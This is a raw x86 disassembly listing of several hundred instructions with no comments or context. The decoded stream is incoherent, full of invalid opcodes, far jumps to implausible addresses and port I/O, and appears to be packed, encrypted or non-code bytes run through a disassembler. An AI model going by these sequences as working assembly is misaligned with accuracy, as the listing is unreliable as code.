  41601e:	adc    edi,edi
  416020:	jmp    0xababf2
  416025:	sar    BYTE PTR [edi-0x77],0xcb
  416029:	adc    ebx,DWORD PTR [edi]
  41602b:	jmp    0x41602c
  41602d:	or     al,0x88
  41602f:	std    
  416030:	adc    eax,0x40c7a3
  416035:	jl     0x415fba
  416037:	push   edi
  416038:	pop    ebx
  416039:	mov    bl,BYTE PTR [ecx]
  41603b:	lea    eax,[edx]
  41603d:	or     edx,esi
  41603f:	rcl    DWORD PTR [ebp-0x80],0x31
  416043:	jl     0x416031
  416045:	jg     0x41601b
  416047:	add    BYTE PTR [eax],al
  416049:	add    DWORD PTR [ebp-0x78f4bfeb],0xa5925756
  416053:	adc    eax,0x972dfb40
  416058:	mov    dl,0xcb
  41605a:	aad    0x89
  41605c:	lock inc esi
  41605e:	sub    ecx,DWORD PTR [esi]
  416060:	test   dh,dl
  416062:	aam    0x0
  416064:	add    BYTE PTR [ecx+0x235587a2],dh
  41606a:	jl     0x416050
  41606c:	call   0x8e3f8360
  416071:	imul   BYTE PTR ds:0xd5bb80b4
  416077:	add    al,ch
  416079:	inc    eax
  41607a:	cmp    ebp,0x879b00ff
  416080:	dec    ebp
  416081:	and    eax,DWORD PTR [edi+eax*4+0x3184234d]
  416088:	inc    DWORD PTR [eax]
  41608a:	mov    ch,0x4c
  41608c:	js     0x416086
  41608e:	(bad)
  416093:	out    dx,eax
  416094:	add    eax,DWORD PTR [ebx+0xb133]
  41609a:	jmp    0x568cea1f
  41609f:	jb     0x41606f
  4160a1:	cld    
  4160a2:	mov    dl,0xa2
  4160a4:	add    eax,0xff130555
  4160aa:	cmp    eax,0xba938983
  4160af:	scas   eax,DWORD PTR es:[edi]
  4160b0:	jae    0x4160af
  4160b2:	jmp    0x4160b5
  4160b4:	add    BYTE PTR [eax],al
  4160b6:	bound  ebp,QWORD PTR [edx+0x581d5c96]
  4160bc:	xchg   DWORD PTR [ebx+0x16],eax
  4160bf:	xrelease xchg DWORD PTR [eax],ecx
  4160c2:	or     eax,0x9f8908f2
  4160c7:	ror    BYTE PTR ds:[eax+0xfd5776a],1
  4160ce:	fild   WORD PTR [edx+0x3]
  4160d1:	cmp    esi,0xffffff82
  4160d4:	add    BYTE PTR [eax],al
  4160d6:	fld    st(5)
  4160d8:	js     0x416065
  4160da:	aaa    
  4160db:	adc    al,BYTE PTR [edi+0x73f23008]
  4160e1:	dec    edi
  4160e2:	jbe    0x4160e1
  4160e4:	aas    
  4160e5:	or     eax,0xffffc3df
  4160ea:	bound  ecx,QWORD PTR [ebx]
  4160ec:	shr    edi,0x0
  4160ef:	out    0x55,eax
  4160f1:	ins    BYTE PTR es:[edi],dx
  4160f2:	mov    DWORD PTR [edx+0x54],ebx
  4160f5:	call   0x83ae59
  4160fa:	push   eax
  4160fb:	popf   
  4160fc:	mov    cl,0x81
  4160fe:	shl    BYTE PTR [ebp+0x5],0xa5
  416102:	add    BYTE PTR [edx-0x7e],ah
  416105:	scas   eax,DWORD PTR es:[edi]
  416106:	call   DWORD PTR [ecx+ebx*8+0x5b]
  41610a:	inc    edx
  41610b:	adc    ah,BYTE PTR [esi+0x65]
  41610e:	sti    
  41610f:	jbe    0x4160a9
  416111:	adc    edx,ebx
  416113:	fcomp  DWORD PTR [esi-0x6]
  416116:	jbe    0x41617f
  416118:	cwde   
  416119:	nop
  41611a:	das    
  41611b:	mov    dl,0x81
  41611d:	inc    edi
  41611e:	adc    BYTE PTR [eax-0x27],ah
  416121:	data16 aas 
  416123:	jb     0x416183
  416125:	sub    dh,ch
  416127:	iret   
  416128:	fs sub eax,0xce2de970
  41612e:	ror    bl,cl
  416130:	std    
  416131:	fs (bad) 
  416133:	call   0x7530:0x9075cb97
  41613a:	(bad)  
  41613b:	jb     0x4160d5
  41613d:	mov    ebx,0xc61e1f75
  416142:	loopne 0x416151
  416144:	cwde   
  416145:	jmp    0xad75:0x3a2b5a88
  41614c:	in     eax,0x64
  41614e:	inc    esp
  41614f:	jno    0x416122
  416151:	inc    ebx
  416153:	add    al,bl
  416155:	pop    ebp
  416156:	and    dh,BYTE PTR [esi-0x19]
  416159:	xchg   edi,eax
  41615a:	sbb    dh,BYTE PTR [ebp+0x71]
  41615d:	xlat   BYTE PTR gs:[ebx]
  41615f:	ret    
  416160:	aad    0x5c
  416162:	stos   BYTE PTR es:[edi],al
  416163:	lock jle 0x416169
  416166:	imul   eax,DWORD PTR [edi+0x756420f1],0xffffffbf
  41616d:	lods   eax,DWORD PTR gs:[esi]
  41616f:	jnp    0x41613b
  416171:	aad    0xe4
  416173:	add    DWORD PTR [edx+0x5d],esp
  416176:	sub    dh,al
  416178:	dec    edx
  416179:	add    ebp,ecx
  41617b:	mov    ecx,0x3aa7756
  416180:	jmp    0xfe7262aa
  416185:	ret    0xeb0d
  416188:	popa   
  416189:	add    BYTE PTR [edi],0x6a
  41618c:	(bad)  
  41618d:	adc    dh,BYTE PTR [ebp-0x1c]
  416190:	loop   0x416122
  416192:	add    bl,BYTE PTR [edx+ebx*2-0x14963f69]
  416199:	cld    
  41619a:	or     ebp,DWORD PTR [edi+0x48]
  41619d:	xchg   esi,eax
  41619e:	cld    
  41619f:	(bad)  
  4161a0:	jmp    0xfbe1:0xda99f51a
  4161a7:	cwde   
  4161a8:	pop    ecx
  4161a9:	pusha  
  4161aa:	inc    esi
  4161ab:	fst    DWORD PTR [ecx]
  4161ad:	bound  ecx,QWORD PTR [ecx]
  4161af:	ficom  WORD PTR [eax]
  4161b1:	fild   WORD PTR [edi-0x77d655d4]
  4161b7:	loope  0x4161b9
  4161b9:	scas   al,BYTE PTR es:[edi]
  4161ba:	adc    DWORD PTR es:[ecx+eiz*4-0x1c],ebp
  4161bf:	test   dh,dl
  4161c1:	mov    ss,WORD PTR [esp+edi*8-0x7770eb9e]
  4161c8:	and    al,0x8a
  4161ca:	sub    DWORD PTR [eax+0x92b76f9],ecx
  4161d0:	jb     0x4161c9
  4161d2:	sub    al,0xfc
  4161d4:	cmp    DWORD PTR [esi+0x26],ebx
  4161d7:	addr16 invd 
  4161da:	(bad)  
  4161db:	int3   
  4161dc:	xchg   ecx,eax
  4161dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161de:	cmp    esp,0x7e
  4161e1:	scas   al,BYTE PTR es:[edi]
  4161e2:	xor    al,0x58
  4161e4:	mov    al,ds:0xc7e92622
  4161e9:	jo     0x4161c4
  4161eb:	add    BYTE PTR ds:0x1b0b0b62,ah
  4161f1:	sub    DWORD PTR [ecx-0x6bc9ac6c],eax
  4161f7:	jmp    0xfcd5919e
  4161fc:	add    BYTE PTR [eax],dh
  4161fe:	loopne 0x4161e8
  416200:	xor    al,0x58
  416202:	or     eax,0x110fe8fe
  416207:	(bad)  
  416208:	jmp    DWORD PTR [ebx]
  41620a:	push   es
  41620b:	icebp  
  41620c:	inc    DWORD PTR [ebx+ecx*2-0x4]
  416210:	out    0xc1,eax
  416212:	adc    dh,bh
  416214:	push   DWORD PTR [edx-0x30367fe7]
  41621a:	test   DWORD PTR ds:0xb44a00b7,0xefcfc07f
  416224:	cmp    eax,0xf11870b
  41622a:	mov    WORD PTR [ebx-0x7abc7cfe],ds
  416230:	jo     0x416237
  416232:	enter  0x5905,0x75
  416236:	ds xor eax,0xda3b000d
  41623c:	jecxz  0x4161ca
  41623e:	or     ebx,edx
  416240:	add    BYTE PTR [ebx+0x866dd69],al
  416246:	jae    0x416266
  416248:	push   edx
  416249:	mov    esi,ecx
  41624b:	pop    edi
  41624c:	les    esi,FWORD PTR [ebp+ebx*2-0x26]
  416250:	mov    ch,0x1
  416252:	pop    ebp
  416253:	pusha  
  416254:	shl    DWORD PTR [ebp+eiz*2-0x32],0xce
  416259:	push   edi
  41625a:	add    BYTE PTR [edi],0x82
  41625d:	clc    
  41625e:	sbb    edx,DWORD PTR [ecx-0x6373f0ef]
  416264:	add    al,BYTE PTR [ebx+0x5708553]
  41626a:	cmp    BYTE PTR ds:0xb3ce7559,al
  416270:	add    BYTE PTR [edi-0x38],bl
  416273:	sbb    dl,BYTE PTR [eax+0x56]
  416276:	bound  ebx,QWORD PTR [edx+0x6f555b09]
  41627c:	mov    esp,DWORD PTR ss:[eax+esi*8]
  416280:	out    0x80,al
  416282:	add    BYTE PTR [edx-0x5cf80878],bl
  416288:	and    DWORD PTR [ecx],ecx
  41628a:	and    DWORD PTR [eax-0x10e1a411],0x3966af45
  416294:	mov    ebp,0xe1a307f7
  416299:	or     BYTE PTR [ecx+0xe5bb8a0],al
  41629f:	out    dx,eax
  4162a0:	inc    esp
  4162a1:	(bad)  
  4162a2:	cwd    
  4162a4:	mov    ebp,0xe1230cf7
  4162a9:	or     BYTE PTR [ecx-0x3983e5e0],al
  4162af:	popa   
  4162b0:	push   edx
  4162b1:	cmp    DWORD PTR [edi+0x6649a760],0xffffffe7
  4162b8:	mov    ah,0xd2
  4162ba:	pop    edx
  4162bb:	scas   al,BYTE PTR es:[edi]
  4162bc:	jg     0x416241
  4162be:	int    0x63
  4162c0:	pop    es
  4162c1:	inc    edi
  4162c2:	pop    ebp
  4162c3:	jmp    0x416274
  4162c5:	retf   
  4162c6:	shl    cl,0xdf
  4162c9:	add    al,0x6a
  4162cb:	pop    edx
  4162cc:	jmp    0x834e:0x791c0cb
  4162d3:	sub    ebp,edi
  4162d5:	iret   
  4162d6:	or     al,0xb5
  4162d8:	sub    edx,0xd7ef2282
  4162de:	push   ebp
  4162df:	xor    eax,0x606a7a4f
  4162e4:	pop    es
  4162e5:	jb     0x416341
  4162e7:	add    cl,ah
  4162e9:	or     ah,BYTE PTR [ecx]
  4162eb:	jae    0x41634b
  4162ed:	imul   DWORD PTR [ebp-0x17]
  4162f0:	fldenv [bp+0x6b]
  4162f4:	mov    ecx,DWORD PTR [esi]
  4162f6:	call   0xc06ffb01
  4162fb:	xor    ecx,DWORD PTR [ecx]
  4162fd:	xor    bh,0xe9
  416300:	loop   0x416293
  416302:	add    ebx,edi
  416304:	jo     0x416306
  416306:	xor    al,0xfd
  416308:	pop    esi
  416309:	dec    esp
  41630a:	sub    al,BYTE PTR [esi+0x73e7a9a2]
  416310:	arpl   WORD PTR [edi-0x18a450d],bx
  416316:	fimul  WORD PTR [eax-0xd]
  416319:	jge    0x4162d0
  41631b:	jmp    0x6d7fd00
  416320:	jecxz  0x4162c5
  416322:	jmp    0x13a187a5
  416327:	jp     0x41635e
  416329:	pop    ecx
  41632a:	or     BYTE PTR ds:0x7df91e57,al
  416330:	daa    
  416331:	xor    al,0x71
  416333:	xor    eax,0x85a73094
  416338:	sbb    ecx,0x3f
  41633b:	cld    
  41633c:	lea    esi,[eax]
  41633e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633f:	mov    ah,0x1d
  416341:	call   0x806:0x1d0c03da
  416348:	or     eax,0x735f2e
  41634d:	pop    ds
  41634e:	fstp   TBYTE PTR [ebp+0x1dd9a292]
  416354:	pop    es
  416355:	or     bh,BYTE PTR ds:0x60620353
  41635b:	lods   al,BYTE PTR ds:[esi]
  41635c:	shl    BYTE PTR [ebx],cl
  41635e:	fucomp st(1)
  416360:	dec    eax
  416361:	popf   
  416362:	sub    ecx,ebp
  416364:	add    esp,DWORD PTR [edx-0x27]
  416367:	cmp    DWORD PTR [ebx],eax
  416369:	mov    ds:0xa6280193,eax
  41636e:	inc    ebx
  41636f:	add    ch,BYTE PTR [edx+0x6af26098]
  416375:	mov    al,0x23
  416377:	add    ah,dl
  416379:	pop    edi
  41637a:	(bad)  
  41637b:	(bad)  
  41637c:	arpl   WORD PTR [eax-0x12ae96d9],sp
  416382:	sbb    BYTE PTR [ecx],al
  416384:	inc    esi
  416385:	xchg   ecx,eax
  416386:	xlat   BYTE PTR ds:[ebx]
  416387:	call   0x118a2b4
  41638c:	ins    BYTE PTR es:[edi],dx
  41638d:	push   ds
  41638e:	or     BYTE PTR ds:0xc03321fb,al
  416394:	jb     0x4163b6
  416396:	sahf   
  416397:	inc    ebx
  416398:	mov    ecx,0xe900d965
  41639d:	or     DWORD PTR [ebp+0x78],esi
  4163a0:	call   0xa743ad06
  4163a5:	sahf   
  4163a6:	sub    BYTE PTR [ebx+0x72],dl
  4163a9:	shr    DWORD PTR [eax+ecx*4],1
  4163ac:	scas   eax,DWORD PTR es:[edi]
  4163ad:	xor    DWORD PTR [edx+0x7d],esp
  4163b0:	lds    eax,FWORD PTR [eax]
  4163b2:	push   ecx
  4163b3:	and    DWORD PTR [ebp+0xc],esi
  4163b6:	adc    al,0xd9
  4163b8:	push   edi
  4163b9:	adc    ah,BYTE PTR [edi-0x5ac5d1fa]
  4163bf:	and    edx,DWORD PTR [ebp+0x41]
  4163c2:	mov    gs,WORD PTR [esi+0x41]
  4163c5:	jmp    0xd146665c
  4163ca:	loope  0x41639c
  4163cc:	(bad)  
  4163cd:	call   0xe5b7fdae
  4163d2:	aaa    
  4163d3:	cdq    
  4163d4:	call   0x5174dca7
  4163d9:	xchg   edx,eax
  4163da:	bound  ebx,QWORD PTR [edx+0x7b]
  4163dd:	or     eax,0xeb511b9b
  4163e2:	popa   
  4163e3:	fld    DWORD PTR [eax]
  4163e5:	add    bl,dh
  4163e7:	stos   DWORD PTR es:[edi],eax
  4163e8:	jns    0x4163eb
  4163ea:	mov    ebx,0xa7247509
  4163ef:	adc    ecx,DWORD PTR [ebx+0x54]
  4163f2:	push   esp
  4163f3:	xor    eax,0xd6c93b45
  4163f8:	cmc    
  4163f9:	fsub   DWORD PTR [eax+0x1d]
  4163fc:	neg    al
  4163fe:	in     al,dx
  4163ff:	test   al,0x59
  416401:	ret    0xd683
  416404:	push   edx
  416405:	mov    ebx,DWORD PTR [edx+0x15]
  416408:	inc    ebx
  416409:	push   eax
  41640a:	ror    DWORD PTR [esi+0x6f],cl
  41640d:	and    DWORD PTR [ecx-0x28b17824],esp
  416413:	scas   al,BYTE PTR es:[edi]
  416414:	mov    eax,0xd6cb009e
  416419:	std    
  41641a:	jno    0x4163a3
  41641c:	cs cmp edi,DWORD PTR cs:[ecx-0x2a]
  416421:	jg     0x4163e3
  416423:	neg    cl
  416425:	shl    BYTE PTR cs:[eax-0x1d],0xc5
  41642a:	inc    esi
  41642b:	jmp    0x416409
  41642d:	add    BYTE PTR [eax],al
  41642f:	cmp    ecx,DWORD PTR [ecx]
  416431:	jne    0x416457
  416433:	pop    ds
  416434:	adc    ecx,DWORD PTR [ebx+0x54]
  416437:	cmp    al,0x91
  416439:	and    BYTE PTR [ebx+edx*1],cl
  41643c:	or     BYTE PTR [edi],dh
  41643e:	add    bh,BYTE PTR [ebx]
  416440:	or     ebx,ecx
  416442:	sbb    ecx,ebx
  416444:	or     ecx,ebx
  416446:	pop    esi
  416447:	leave  
  416448:	xchg   esp,eax
  416449:	cld    
  41644a:	push   ebp
  41644b:	int3   
  41644c:	nop
  41644d:	and    BYTE PTR [eax],cl
  41644f:	or     BYTE PTR [ecx+ebp*8],0x5c
  416453:	xor    esp,ebx
  416455:	add    BYTE PTR [eax+0xb],ch
  416458:	fadd   DWORD PTR [eax]
  41645a:	add    BYTE PTR [esi+0x53],bh
  41645d:	push   eax
  41645e:	(bad)  
  41645f:	bound  eax,QWORD PTR [edx-0x7fdd61bc]
  416465:	pop    eax
  416466:	xchg   edx,eax
  416467:	cwde   
  416468:	jle    0x41646a
  41646a:	add    DWORD PTR [eax+ebp*8+0x4],0x9f01cc5
  416472:	add    BYTE PTR [edx-0x80],ah
  416475:	ja     0x41643d
  416477:	adc    al,0xbe
  416479:	or     BYTE PTR [eax],al
  41647b:	add    BYTE PTR [edi+eax*1],dl
  41647e:	jbe    0x416468
  416480:	dec    esi
  416481:	add    BYTE PTR [eax],0x0
  416484:	xchg   esp,eax
  416485:	cmp    esp,DWORD PTR [eax+ecx*1]
  416488:	arpl   WORD PTR [ebx+eax*1-0x77],dx
  41648c:	pushf  
  41648d:	daa    
  41648e:	out    dx,eax
  41648f:	mov    ch,0x63
  416491:	xor    BYTE PTR [edi-0x3a],0x1c
  416495:	mov    esi,0x70c0008
  41649a:	jbe    0x416425
  41649c:	sbb    al,0x4c
  41649e:	inc    ebx
  41649f:	push   es
  4164a0:	sahf   
  4164a1:	or     ebp,eax
  4164a3:	inc    DWORD PTR [ebp+0x4c]
  4164a6:	mov    dh,0xff
  4164a8:	push   ebp
  4164a9:	rol    BYTE PTR [edx],0x8
  4164ac:	push   es
  4164ad:	inc    ebx
  4164ae:	add    BYTE PTR [esi+0x21],bl
  4164b1:	outs   dx,BYTE PTR ds:[esi]
  4164b2:	ja     0x4164a0
  4164b4:	loope  0x416444
  4164b6:	adc    al,0x56
  4164b8:	lea    ecx,[ebx]
  4164ba:	icebp  
  4164bb:	pop    es
  4164bc:	fnstenv [ecx-0x7da58281]
  4164c2:	stc    
  4164c3:	dec    eax
  4164c4:	loope  0x4164e6
  4164c6:	adc    eax,0x81e98e00
  4164cb:	dec    ebp
  4164cc:	mov    dh,0x37
  4164ce:	leave  
  4164cf:	jmp    0x416534
  4164d1:	add    BYTE PTR [eax],0x0
  4164d4:	jmp    0xf284e25a
  4164d9:	fldcw  WORD PTR [esi-0x3c]
  4164dc:	popa   
  4164dd:	bound  esp,QWORD PTR ds:0x1edd0078
  4164e3:	xchg   edx,eax
  4164e4:	(bad)  
  4164e6:	(bad)  
  4164e7:	adc    al,0x14
  4164e9:	jmp    0x979cfb0c
  4164ee:	cmp    cl,ch
  4164f0:	add    ebx,esi
  4164f2:	cdq    
  4164f3:	std    
  4164f4:	pop    esi
  4164f5:	jecxz  0x416506
  4164f7:	(bad)  
  4164f8:	add    ebp,DWORD PTR [esi]
  4164fa:	out    0x62,eax
  4164fc:	cmc    
  4164fd:	push   ebp
  4164fe:	pop    esi
  4164ff:	stos   DWORD PTR es:[edi],eax
  416500:	xlat   BYTE PTR ds:[ebx]
  416501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416502:	pop    es
  416503:	(bad)  
  416504:	pop    ebx
  416505:	pop    edx
  416506:	shl    edi,cl
  416508:	add    esp,ecx
  41650a:	cdq    
  41650b:	mov    ebp,0x4f995007
  416510:	add    edx,edx
  416512:	ficom  DWORD PTR [edx-0x19645b33]
  416518:	add    edx,DWORD PTR [ecx]
  41651a:	fs push ss
  41651c:	add    BYTE PTR [esi+0x217ab991],0xe1
  416523:	mov    dh,0xd5
  416525:	mov    dh,0x64
  416527:	adc    DWORD PTR [edx],ebp
  416529:	lahf   
  41652a:	aad    0x74
  41652c:	(bad)  
  41652d:	ins    DWORD PTR es:[edi],dx
  41652e:	pop    esi
  41652f:	xor    edx,DWORD PTR [ebx-0x116269e]
  416535:	mov    eax,ds:0xa5ed678b
  41653a:	fstp   DWORD PTR [ebp+eax*1-0xe]
  41653e:	fnop   
  416540:	stc    
  416541:	and    al,0x90
  416543:	jmp    0xd75e:0xe5b90078
  41654a:	gs fistp QWORD PTR fs:[edx-0x4a]
  41654f:	mov    ch,0xed
  416551:	shl    BYTE PTR [ebx-0x6158fe9c],1
  416557:	icebp  
  416558:	jbe    0x416542
  41655a:	popa   
  41655b:	fidiv  WORD PTR [edx-0x1da5b8c9]
  416561:	push   ds
  416562:	jmp    0x85de:0x6b907fd6
  416569:	jl     0x4165c9
  41656b:	fld    DWORD PTR [eax]
  41656d:	jb     0x416519
  41656f:	mov    ebx,0xc231ea0c
  416574:	fsub   DWORD PTR [eax-0x66]
  416577:	mov    ebx,0xde79640c
  41657c:	test   BYTE PTR [ebx+0x7200d966],dl
  416582:	pushf  
  416583:	pop    ds
  416584:	dec    ecx
  416585:	mov    eax,ds:0xa1491195
  41658a:	xchg   esi,eax
  41658b:	pop    edx
  41658c:	xchg   ecx,eax
  41658d:	jmp    0xa77b3ef3
  416592:	cdq    
  416593:	fadd   QWORD PTR [eax+ebp*1+0x6400d966]
  41659a:	sub    ecx,DWORD PTR [edi]
  41659c:	or     edi,DWORD PTR [edx-0x689736d]
  4165a2:	imul   bl
  4165a4:	pop    esp
  4165a5:	jmp    DWORD PTR [ecx]
  4165a7:	(bad)  
  4165a8:	jg     0x4165cf
  4165aa:	add    BYTE PTR [edx+0x60],ah
  4165ad:	inc    esi
  4165ae:	fnsave [edi]
  4165b0:	pop    eax
  4165b1:	sbb    DWORD PTR [edx+0x1d],esi
  4165b4:	fild   WORD PTR [edi+0x2515b926]
  4165ba:	fstp   DWORD PTR [ecx-0x41190479]
  4165c0:	push   ebp
  4165c1:	shr    esi,0xdd
  4165c4:	push   0x361e901
  4165c9:	add    al,BYTE PTR [ecx-0x62]
  4165cc:	outs   dx,DWORD PTR ds:[esi]
  4165cd:	inc    ecx
  4165ce:	add    bl,bh
  4165d0:	std    
  4165d1:	jb     0x41662b
  4165d3:	jbe    0x416621
  4165d5:	push   eax
  4165d6:	call   0x402811
  4165db:	jle    0x4165f7
  4165dd:	jne    0x41665c
  4165df:	les    eax,FWORD PTR [ebp-0x26c974f8]
  4165e5:	std    
  4165e6:	ja     0x4165ab
  4165e8:	std    
  4165e9:	jb     0x416643
  4165eb:	in     al,0x84
  4165ed:	push   eax
  4165ee:	call   0x3d7ff7
  4165f3:	aas    
  4165f4:	sbb    dh,BYTE PTR [ebp+0x65]
  4165f7:	dec    eax
  4165f8:	je     0x41664e
  4165fa:	add    ah,bh
  4165fc:	xchg   esp,eax
  4165fd:	dec    esp
  4165fe:	add    eax,0xeb00dabb
  416603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416604:	adc    DWORD PTR [ebx+0x64],eax
  416607:	pusha  
  416608:	xchg   esi,eax
  416609:	or     al,0x74
  41660b:	(bad)  
  41660c:	std    
  41660d:	jne    0x41661b
  41660f:	add    BYTE PTR [eax],dl
  416611:	dec    edi
  416612:	or     bh,bh
  416614:	int3   
  416615:	xchg   edx,eax
  416616:	dec    esp
  416617:	(bad)  
  416618:	mov    esi,0x48b4e8ea
  41661d:	fild   DWORD PTR [eax]
  41661f:	test   BYTE PTR [ebx],bh
  416621:	xchg   BYTE PTR [edx],bh
  416623:	mov    esi,DWORD PTR ds:0x4a793632
  416629:	fimul  DWORD PTR [ecx+0x7f8e1f54]
  41662f:	fist   DWORD PTR [ebp+ecx*1+0x1e]
  416633:	inc    DWORD PTR [edx+eax*1-0x7e]
  416637:	jle    0x416614
  416639:	fidivr DWORD PTR [edx+0xc]
  41663c:	enter  0x4c7c,0x5
  416640:	(bad)  
  416641:	fisttp DWORD PTR [ecx+0x21572f45]
  416647:	add    BYTE PTR [edx+0x68],ah
  41664a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41664b:	sbb    eax,0x462b8062
  416650:	stos   BYTE PTR es:[edi],al
  416651:	jp     0x416693
  416653:	(bad)  
  416654:	and    ch,bh
  416656:	(bad)  
  416657:	pop    eax
  416658:	jmp    0x530330f9
  41665d:	xor    BYTE PTR [esi],0xc0
  416660:	stc    
  416661:	jb     0x416635
  416663:	mov    dh,dh
  416665:	ror    dh,cl
  416667:	mov    bl,dl
  416669:	into   
  41666a:	xor    ebx,ecx
  41666c:	xor    DWORD PTR ds:0x7da51fb7,ebp
  416672:	pop    esp
  416673:	sahf   
  416674:	add    BYTE PTR [edx],ah
  416676:	sbb    BYTE PTR [eax-0x29],0xbf
  41667a:	push   es
  41667b:	push   0x772d636a
  416680:	nop
  416681:	bound  eax,QWORD PTR [eax+0x2c96e800]
  416687:	push   0x83c94fd
  41668c:	(bad)  
  41668d:	call   0x24c85ac6
  416692:	jl     0x416711
  416694:	pop    esi
  416695:	jb     0x4166a0
  416697:	(bad)  
  416698:	adc    ebp,ebx
  41669a:	or     BYTE PTR gs:[eax+ebx*2-0x77],dh
  41669f:	leave  
  4166a0:	pop    es
  4166a1:	not    bh
  4166a3:	fiadd  DWORD PTR [edx]
  4166a5:	gs fs clc 
  4166a8:	mov    dh,BYTE PTR [edx+edx*2-0x256db187]
  4166af:	mov    eax,0x838263d0
  4166b4:	clc    
  4166b5:	pop    edi
  4166b6:	push   es
  4166b7:	add    eax,DWORD PTR [edi+0x4372129c]
  4166bd:	pop    edx
  4166be:	xor    cl,0x5
  4166c1:	fcmovnu st,st(1)
  4166c3:	and    DWORD PTR [ebx+0x62],0xffffffd9
  4166c7:	jmp    0x34d55196
  4166cc:	iret   
  4166cd:	mov    eax,0xb403f697
  4166d2:	pusha  
  4166d3:	mov    ecx,0xe9d96e5b
  4166d8:	add    eax,DWORD PTR [eax]
  4166da:	hlt    
  4166db:	adc    eax,0x8f4fc0e
  4166e0:	jecxz  0x416760
  4166e2:	sbb    al,0x82
  4166e4:	retf   
  4166e5:	scas   eax,DWORD PTR es:[edi]
  4166e6:	in     eax,0x8c
  4166e8:	outs   dx,DWORD PTR ds:[esi]
  4166e9:	inc    ecx
  4166ea:	cmp    al,0x97
  4166ec:	out    dx,al
  4166ed:	add    ebp,DWORD PTR [eax+eiz*2]
  4166f0:	cdq    
  4166f1:	jle    0x41670f
  4166f3:	in     eax,0xaa
  4166f5:	add    DWORD PTR [esi-0x35fbd595],edi
  4166fb:	jmp    0x5ea36b3d
  416700:	pop    esp
  416701:	xchg   ebx,eax
  416702:	(bad)  
  416703:	fldl2t 
  416705:	pop    ebx
  416706:	int    0x8e
  416708:	pop    ebx
  416709:	push   0xffffffe9
  41670b:	sbb    ecx,DWORD PTR [edx]
  41670d:	pop    esp
  41670e:	in     eax,0x8e
  416710:	dec    ebx
  416711:	push   0xffffffa7
  416713:	rcl    DWORD PTR [ebp-0x77],cl
  416716:	and    bl,cl
  416718:	fwait
  416719:	inc    esi
  41671a:	sub    eax,0x8d7e9d28
  41671f:	pusha  
  416720:	sahf   
  416721:	pop    ds
  416722:	push   edx
  416723:	and    edx,DWORD PTR [edx]
  416725:	push   ebx
  416726:	mov    esp,0xae7ee9d9
  41672b:	mov    ch,0xf1
  41672d:	jle    0x416779
  41672f:	and    DWORD PTR ds:0x70d962a1,0x64dd81bf
  416739:	pop    eax
  41673a:	mov    dh,0x25
  41673c:	add    DWORD PTR [eax+eax*1+0x12],esp
  416740:	xlat   BYTE PTR ds:[ebx]
  416741:	call   FWORD PTR [eax]
  416743:	stos   BYTE PTR es:[edi],al
  416744:	and    dl,BYTE PTR ds:0x24915d1
  41674a:	jmp    0x2ab700ec
  41674f:	xchg   edi,eax
  416750:	enter  0xf75c,0x21
  416754:	mov    WORD PTR [ebx+0x72],ss
  416757:	mul    edi
  416759:	push   ebp
  41675a:	mov    esi,0x1e1cb7f2
  41675f:	mov    esp,DWORD PTR [ebx-0x2905400]
  416765:	and    al,0x5
  416767:	adc    eax,0x75c5758d
  41676c:	repz ret 
  41676e:	out    dx,al
  41676f:	xchg   DWORD PTR [ecx+0x2664a67f],edi
  416775:	cld    
  416776:	lahf   
  416777:	pop    edi
  416778:	nop
  416779:	and    BYTE PTR [ebp-0x113c0c92],0xac
  416780:	loope  0x416801
  416782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416783:	fs dec ecx
  416785:	add    ch,BYTE PTR [edi]
  416787:	arpl   cx,bx
  416789:	daa    
  41678a:	loop   0x4167f9
  41678c:	push   esp
  41678d:	js     0x416780
  41678f:	stos   BYTE PTR es:[edi],al
  416790:	adc    BYTE PTR [edx+eiz*2],0xcf
  416794:	out    0xe8,eax
  416796:	mov    esi,0x6afc8bce
  41679b:	xchg   edi,esp
  41679d:	add    BYTE PTR [edx+0x7f],ch
  4167a0:	jecxz  0x4167a2
  4167a2:	cli    
  4167a3:	add    BYTE PTR [ecx],ah
  4167a5:	pop    eax
  4167a6:	out    dx,al
  4167a7:	not    ch
  4167a9:	cwde   
  4167aa:	pop    ebx
  4167ab:	mov    esp,0xe1bf242e
  4167b0:	popa   
  4167b1:	add    DWORD PTR [esi],0x19
  4167b4:	push   edx
  4167b5:	pop    ss
  4167b6:	add    DWORD PTR [eax],eax
  4167b8:	cmp    bh,BYTE PTR [edi+esi*1+0x56]
  4167bc:	jge    0x41673f
  4167be:	jo     0x416804
  4167c0:	dec    ebx
  4167c1:	test   eax,0xe4cf15fd
  4167c6:	inc    eax
  4167c7:	add    bl,bl
  4167c9:	push   es
  4167ca:	jne    0x416810
  4167cc:	or     ebp,DWORD PTR [edi-0x4]
  4167cf:	je     0x4167dd
  4167d1:	push   esi
  4167d2:	and    BYTE PTR [eax-0x36660],bl
  4167d8:	psubusb mm0,mm2
  4167db:	add    eax,0x40ad97
  4167e0:	or     ebx,DWORD PTR [edx]
  4167e2:	add    ah,dh
  4167e4:	aaa    
  4167e5:	cdq    
  4167e6:	cld    
  4167e7:	mov    BYTE PTR [ebp-0x45e036a],cl
  4167ed:	jp     0x41682f
  4167ef:	add    BYTE PTR [ebp-0x36bff000],dl
  4167f5:	xchg   esi,eax
  4167f6:	cld    
  4167f7:	pop    ebp
  4167f8:	clc    
  4167f9:	add    DWORD PTR [ebp+0x24],esi
  4167fc:	mov    bl,0x1
  4167fe:	jne    0x416824
  416800:	ret    
  416801:	add    DWORD PTR [eax+ecx*1+0x3c],ebp
  416805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416806:	add    BYTE PTR [ebx-0x3d7d8900],al
  41680c:	or     BYTE PTR [ebx+0x23f189a8],cl
  416812:	push   es
  416813:	test   DWORD PTR [eax],0x2445087b
  416819:	xchg   ebx,eax
  41681a:	xlat   BYTE PTR ds:[ebx]
  41681b:	je     0x416824
  41681d:	lock iret 
  41681f:	call   0x1186214
  416824:	mov    eax,DWORD PTR [ebp-0x60]
  416827:	ret    0x7b04
  41682a:	fwait
  41682b:	mov    esp,ebp
  41682d:	enter  0xd22,0x8b
  416831:	bound  edi,QWORD PTR ds:0x64d95608
  416837:	clc    
  416838:	push   esp
